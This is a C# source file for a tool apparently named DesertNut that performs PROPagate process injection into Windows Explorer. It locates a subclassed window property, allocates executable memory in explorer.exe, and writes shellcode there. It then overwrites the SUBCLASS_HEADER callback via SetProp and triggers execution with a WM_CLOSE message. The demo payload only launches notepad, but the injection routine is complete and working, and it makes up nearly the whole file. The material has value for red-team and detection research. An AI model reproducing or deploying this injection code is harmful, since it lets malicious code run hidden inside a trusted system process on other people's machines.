using System;
using System.Collections.Generic;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using System.Runtime.InteropServices;

namespace DesertNut
{
    class Program
    {
        public static void PROPPagate()
        {
            // Search for target subclass in explorer
            Console.WriteLine("[+] Searching for Subclass property..", Color.LightGreen);
            List<DesertNut_h.WndPropStruc> CallResult = DesertNut_h.EnumSubClassProps(false);
            foreach (DesertNut_h.WndPropStruc Entry in CallResult)
            {
                if (Entry.ParentClassName == "Progman" && Entry.ChildClassName == "SHELLDLL_DefView")
                {
                    DesertNut_h.TargetSubclass = Entry;
                }
            }

            // Check result
            if (DesertNut_h.TargetSubclass.dwPid == 0)
            {
                Console.WriteLine("[!] Unable to find property..", Color.Red);
                return;
            } else
            {
                Console.WriteLineFormatted("{0} {4}{1} " + DesertNut_h.TargetSubclass.dwPid + "{3} {5}{1} " + DesertNut_h.TargetSubclass.ImageName, Color.White, DesertNut_h.sProperties);
                Console.WriteLineFormatted("    {2} {9}{1} " + DesertNut_h.TargetSubclass.ParentClassName + "{3} {10}{1} " + DesertNut_h.TargetSubclass.ChildClassName, Color.White, DesertNut_h.sProperties);
            }

            // Fetch Subclass header
            IntPtr pLocalHeaderCopy = DesertNut_h.ReadSubclassHeader(DesertNut_h.TargetSubclass);
            if (pLocalHeaderCopy == IntPtr.Zero)
            {
                Console.WriteLine("[!] Failed to duplicate subclass header..", Color.Red);
                return;
            }

            // Open process
            IntPtr hProc = DesertNut_h.OpenProcess(0x1F0FFF, false, (int)DesertNut_h.TargetSubclass.dwPid);

            // Remote shellcode alloc
            Console.WriteLine("[+] Allocating remote shellcode..", Color.LightGreen);
            IntPtr rScPointer = DesertNut_h.VirtualAllocEx(hProc, IntPtr.Zero, (uint)DesertNut_h.NotepadSc.Length, 0x3000, 0x40);
            if (rScPointer == IntPtr.Zero)
            {
                Console.WriteLine("[!] Unable to allocate shellcode in remote process..", Color.Red);
                return;
            } else
            {
                Console.WriteLineFormatted("    {2} {15}{1} " + DesertNut_h.NotepadSc.Length, Color.White, DesertNut_h.iProperties);
                Console.WriteLineFormatted("    {2} {16}{1} " + "0x" + String.Format("{0:X}", (rScPointer).ToInt64()), Color.White, DesertNut_h.iProperties);
                // Write the byte array
                uint BytesWritten = 0;
                Boolean WriteResult = DesertNut_h.WriteProcessMemory(hProc, rScPointer, DesertNut_h.NotepadSc, (uint)DesertNut_h.NotepadSc.Length, ref BytesWritten);
                if (!WriteResult)
                {
                    Console.WriteLine("[!] Failed to write shellcode..", Color.Red);
                    DesertNut_h.VirtualFreeEx(hProc, rScPointer, 0, 0x8000);
                    return;
                }
            }

            // Rewrite copy of SUBCLASS_HEADER
            Console.WriteLine("[+] Rewriting local SUBCLASS_HEADER..", Color.LightGreen);
            // Recast Ptr2Struct, we need a rewrite SUBCLASS_HEADER->CallArray->pfnSubclass
            DesertNut_h.SUBCLASS_HEADER SubclassHeader = new DesertNut_h.SUBCLASS_HEADER();
            SubclassHeader = (DesertNut_h.SUBCLASS_HEADER)Marshal.PtrToStructure(pLocalHeaderCopy, typeof(DesertNut_h.SUBCLASS_HEADER));
            SubclassHeader.CallArray.pfnSubclass = rScPointer;

            // Remote SUBCLASS_HEADER alloc
            Console.WriteLine("[+] Allocating remote SUBCLASS_HEADER..", Color.LightGreen);
            // Recast once more back to ptr, this is ugly but unfortunately I'm still a C# halfwit ¯\_(ツ)_/¯
            IntPtr pLocalHeader = Marshal.AllocHGlobal(Marshal.SizeOf(SubclassHeader));
            Marshal.StructureToPtr(SubclassHeader, pLocalHeader, true);
            byte[] HeaderArray = new byte[Marshal.SizeOf(SubclassHeader)];
            Marshal.Copy(pLocalHeader, HeaderArray, 0, Marshal.SizeOf(SubclassHeader));
            IntPtr rHPointer = DesertNut_h.VirtualAllocEx(hProc, IntPtr.Zero, (uint)Marshal.SizeOf(SubclassHeader), 0x3000, 0x40);
            if (rHPointer == IntPtr.Zero)
            {
                Console.WriteLine("[!] Unable to allocate Subclass header in remote process..", Color.Red);
                DesertNut_h.VirtualFreeEx(hProc, rScPointer, 0, 0x8000);
                return;
            }
            else
            {
                Console.WriteLineFormatted("    {2} {17}{1} " + Marshal.SizeOf(SubclassHeader), Color.White, DesertNut_h.iProperties);
                Console.WriteLineFormatted("    {2} {18}{1} " + "0x" + String.Format("{0:X}", (rHPointer).ToInt64()), Color.White, DesertNut_h.iProperties);
                // Write the byte array
                uint BytesWritten = 0;
                Boolean WriteResult = DesertNut_h.WriteProcessMemory(hProc, rHPointer, HeaderArray, (uint)Marshal.SizeOf(SubclassHeader), ref BytesWritten);
                if (!WriteResult)
                {
                    Console.WriteLine("[!] Failed to write Subclass header..", Color.Red);
                    DesertNut_h.VirtualFreeEx(hProc, rScPointer, 0, 0x8000);
                    DesertNut_h.VirtualFreeEx(hProc, rHPointer, 0, 0x8000);
                    return;
                }
            }

            // Update original subclass procedure with SetProp
            Console.WriteLine("[+] Updating original UxSubclassInfo subclass procedure..", Color.LightGreen);
            DesertNut_h.SetProp(DesertNut_h.TargetSubclass.hChildWnd, "UxSubclassInfo", rHPointer);
            // Trigger shellcode execution
            Console.WriteLine("[+] Trigger remote shellcode --> notepad..", Color.LightGreen);
            DesertNut_h.PostMessage(DesertNut_h.TargetSubclass.hChildWnd, 0x10, IntPtr.Zero, IntPtr.Zero); // 0x10 = WM_CLOSE
                                                                                                           // Our custom shellcode is keyed on this!
            // We sleep 200ms to avoid winning a race against the callback
            // Set struct -> call pfnSubclass -> revert struct -> free evil stuff
            System.Threading.Thread.Sleep(200);

            // Restore original subclass procedure with SetProp
            Console.WriteLine("[+] Restoring original UxSubclassInfo subclass procedure..", Color.LightGreen);
            DesertNut_h.SetProp(DesertNut_h.TargetSubclass.hChildWnd, "UxSubclassInfo", DesertNut_h.TargetSubclass.hProperty);

            // Fee remote shellcode
            Console.WriteLine("[+] Freeing remote SUBCLASS_HEADER & shellcode..", Color.LightGreen);
            DesertNut_h.VirtualFreeEx(hProc, rScPointer, 0, 0x8000);
            DesertNut_h.VirtualFreeEx(hProc, rHPointer, 0, 0x8000);
        }

        static void Main(string[] args)
        {
            // Banner
            DesertNut_h.PrintBanner();

            if (args.Length == 0)
            {
                Console.WriteLine("[!] No arguments given..", Color.Red);
                Console.WriteLine("    => -l(--ListSubclassWndProps)    List potentially injectable properties.", Color.LightGreen);
                Console.WriteLine("    => -i(--Inject)                  Inject notepad shellcode into explorer.", Color.LightGreen);
            }
            else
            {
                int ListSubclassWndProp = Array.FindIndex(args, s => new Regex(@"(?i)(-|--|/)(l|ListSubclassWndProps)$").Match(s).Success);
                int PROPagate = Array.FindIndex(args, s => new Regex(@"(?i)(-|--|/)(i|Inject)$").Match(s).Success);
                if (ListSubclassWndProp != -1)
                {
                    List<DesertNut_h.WndPropStruc> CallResult =  DesertNut_h.EnumSubClassProps(true);
                    if (CallResult.Count == 0)
                    {
                        Console.WriteLine("[!] Unable to get Subclassed Window Properties..", Color.Red);
                    }
                    return;
                } else if (PROPagate != -1)
                {
                    PROPPagate();
                }
            }
        }
    }
}
